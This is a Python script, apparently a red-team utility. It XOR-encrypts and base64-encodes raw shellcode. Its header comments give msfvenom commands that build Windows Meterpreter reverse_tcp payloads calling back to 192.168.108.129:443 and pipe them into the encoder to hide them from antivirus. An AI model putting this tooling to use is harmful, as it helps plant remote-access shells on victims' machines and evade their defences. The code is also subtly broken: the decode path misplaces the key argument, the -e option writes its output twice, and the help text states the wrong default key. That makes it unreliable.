#!/usr/bin/env python3
# ex: python3 xor.py msg.raw | base64 -w 0
# Staged
## msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.108.129 LPORT=443 -f raw | python3 xor.py -e
# Stageless
## msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.108.129 LPORT=443 -f raw | python3 xor.py -e

from argparse import ArgumentParser, FileType
from base64 import b64encode, b64decode
import sys

parser = ArgumentParser()
parser.add_argument("input", nargs="?", type=FileType("rb"), default=sys.stdin.buffer, help="input (file or stdin)")
parser.add_argument("-o", "--output", nargs="?", type=FileType("wb"), default=sys.stdout.buffer, help="output (default: stdout)")
parser.add_argument("-k", "--key", type=str, default="sD!ChpaN#29F6RhWjv$4", help="encryption key (default: thisisxorsecret.)")
parser.add_argument("-e", "--b64encode", action="store_true", default=False, help="finally, base64 encode.")
parser.add_argument("-d", "--b64decode", action="store_true", default=False, help="at first, base64 decode.")
args = parser.parse_args()

def encryptDecrypt(input: bytes, key: str):
    output = b""
    for i in range(len(input)):
        xor_num = input[i] ^ ord(key[i % len(key)])
        output += xor_num.to_bytes(1, "little")
    return output

if args.b64encode:
    args.output.write(b64encode(encryptDecrypt(args.input.read(), args.key)))
if args.b64decode:
    args.output.write(encryptDecrypt(b64decode(args.input.read(), args.key)))
else:
    args.output.write(encryptDecrypt(args.input.read(), args.key))
